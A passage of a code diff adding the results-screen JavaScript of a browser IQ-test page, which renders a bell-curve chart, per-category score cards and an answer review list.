+                document.getElementById('percentileVal').textContent = `${stats.percentile}th`;
+                document.getElementById('accuracyVal').textContent = `${stats.correctCount} / ${stats.totalQuestions}`;
+                document.getElementById('timeTakenVal').textContent = stats.timeStr;
+
+                // Render Bell Curve
+                this.renderBellCurve(targetIQ);
+
+                // Render Domain Breakdown
+                this.renderDomains(stats.categoryStats);
+
+                // Render Review List
+                this.renderReviewList();
+            }
+
+            renderBellCurve(userIQ) {
+                const svg = document.getElementById('bellCurveSvg');
+                // SVG dimensions: 600 x 220
+                // Domain of IQ: 55 to 145 (range = 90)
+                const iqToX = (iq) => {
+                    return 50 + ((iq - 55) / 90) * 500;
+                };
+
+                const gauss = (x) => {
+                    const z = (x - 100) / 15;
+                    return Math.exp(-0.5 * z * z);
+                };
+
+                let pathD = 'M 50 180 ';
+                for (let iq = 55; iq <= 145; iq += 1) {
+                    const x = iqToX(iq);
+                    const y = 180 - (gauss(iq) * 140);
+                    pathD += `L ${x.toFixed(1)} ${y.toFixed(1)} `;
+                }
+                pathD += 'L 550 180 Z';
+
+                const userX = iqToX(Math.min(145, Math.max(55, userIQ)));
+                const userY = 180 - (gauss(userIQ) * 140);
+
+                svg.innerHTML = `
+          <defs>
+            <linearGradient id="bellGrad" x1="0" y1="0" x2="0" y2="1">
+              <stop offset="0%" stop-color="#6366f1" stop-opacity="0.45"/>
+              <stop offset="100%" stop-color="#6366f1" stop-opacity="0.0"/>
+            </linearGradient>
+          </defs>
+
+          <!-- Baseline -->
+          <line x1="40" y1="180" x2="560" y2="180" stroke="rgba(255,255,255,0.15)" stroke-width="1.5"/>
+
+          <!-- Standard Deviation lines -->
+          ${[70, 85, 100, 115, 130, 145].map(tickIQ => `
+            <line x1="${iqToX(tickIQ)}" y1="180" x2="${iqToX(tickIQ)}" y2="${180 - gauss(tickIQ) * 140}" stroke="rgba(255,255,255,0.08)" stroke-width="1" stroke-dasharray="3,3"/>
+            <text x="${iqToX(tickIQ)}" y="200" fill="#64748b" font-size="11" font-family="'JetBrains Mono', monospace" text-anchor="middle">${tickIQ}</text>
+          `).join('')}
+
+          <!-- Bell curve fill and stroke -->
+          <path d="${pathD}" fill="url(#bellGrad)"/>
+          <path d="${pathD.replace(/Z$/, '')}" fill="none" stroke="#818cf8" stroke-width="3"/>
+
+          <!-- User Marker Indicator -->
+          <line x1="${userX}" y1="20" x2="${userX}" y2="180" stroke="#06b6d4" stroke-width="2.5" stroke-dasharray="4,4"/>
+          <circle cx="${userX}" cy="${userY}" r="7" fill="#06b6d4" stroke="#fff" stroke-width="2.5"/>
+
+          <!-- Score Banner on Marker -->
+          <rect x="${userX - 45}" y="12" width="90" height="26" rx="6" fill="#0e1424" stroke="#06b6d4" stroke-width="1.5"/>
+          <text x="${userX}" y="29" fill="#38bdf8" font-size="12" font-weight="700" font-family="'Plus Jakarta Sans', sans-serif" text-anchor="middle">You: ${userIQ}</text>
+        `;
+            }
+
+            renderDomains(categoryStats) {
+                const grid = document.getElementById('domainsGrid');
+                grid.innerHTML = '';
+
+                for (const [catName, data] of Object.entries(categoryStats)) {
+                    const pct = Math.round((data.correct / (data.total || 1)) * 100);
+                    const domainIQ = Math.round(75 + (pct / 100) * 65);
+
+                    const card = document.createElement('div');
+                    card.className = 'domain-card';
+                    card.innerHTML = `
+            <div class="domain-header">
+              <span class="domain-name">${catName}</span>
+              <span class="domain-score">IQ ${domainIQ} (${data.correct}/${data.total})</span>
+            </div>
+            <div class="domain-bar-bg">
+              <div class="domain-bar-fill" style="width: 0%"></div>
+            </div>
+            <div class="domain-meta">
+              Accuracy: ${pct}% • ${pct >= 75 ? 'Superior proficiency' : pct >= 50 ? 'Normative proficiency' : 'Developing proficiency'}
+            </div>
+          `;
+                    grid.appendChild(card);
+
+                    // Animate bar
+                    setTimeout(() => {
+                        card.querySelector('.domain-bar-fill').style.width = `${pct}%`;
+                    }, 150);
+                }
+            }
+
+            renderReviewList() {
+                const container = document.getElementById('reviewList');
+                container.innerHTML = '';
+
+                this.questions.forEach((q, idx) => {
+                    const userChoice = this.userAnswers[idx];
+                    const isCorrect = userChoice !== undefined && q.options[userChoice].isCorrect;
+                    const letters = ['A', 'B', 'C', 'D'];
+
+                    const userChoiceText = userChoice !== undefined
+                        ? `${letters[userChoice]} (${q.options[userChoice].text || 'Visual Pattern'})`
+                        : 'Unanswered';
+
+                    const correctIndex = q.options.findIndex(o => o.isCorrect);
+                    const correctText = `${letters[correctIndex]} (${q.options[correctIndex].text || 'Visual Pattern'})`;
+
+                    const item = document.createElement('div');
+                    item.className = `review-item ${isCorrect ? 'is-correct' : 'is-incorrect'}`;
+
+                    item.innerHTML = `
+            <div class="review-top">
+              <span class="review-q-num">Item #${idx + 1} • ${q.category}</span>
+              <span class="review-status-badge ${isCorrect ? 'badge-correct' : 'badge-incorrect'}">
+                ${isCorrect ? '✓ Correct' : '✗ Incorrect'}
+              </span>
+            </div>
+            <div class="review-prompt">${q.prompt}</div>
+            <div class="review-answers-row">
+              Your choice: <strong style="color:${isCorrect ? '#34d399' : '#fb7185'}">${userChoiceText}</strong> <span class="review-sep">|</span> 
+              Correct answer: <strong style="color:#38bdf8">${correctText}</strong>
+            </div>
+            <div class="review-explanation">
+              <strong>Logical Derivation:</strong> ${q.explanation}
+            </div>
+          `;
+                    container.appendChild(item);
+                });
+            }
+        }
+
+        // Initialize application when DOM is ready
+        window.addEventListener('DOMContentLoaded', () => {
+            window.iqApp = new IQTestEngine();
+        });
+    </script>
+</body>
+
+</html>
